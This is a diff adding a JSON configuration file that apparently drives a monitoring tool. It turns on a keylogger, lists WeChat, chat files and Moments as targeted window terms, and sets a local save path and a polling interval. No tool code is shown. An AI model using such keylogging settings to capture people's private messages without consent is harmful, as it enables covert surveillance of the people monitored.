@@ -1,0 +1,12 @@
+{
+    "white_list": [
+        "微信",
+        "WeChat",
+        "聊天文件",
+        "朋友圈"
+    ],
+    "save_path": "D:/doc/local",
+    "sleep_time": 5,
+    "keylogger_enabled": true,
+    "keylogger_respect_whitelist": true
+}
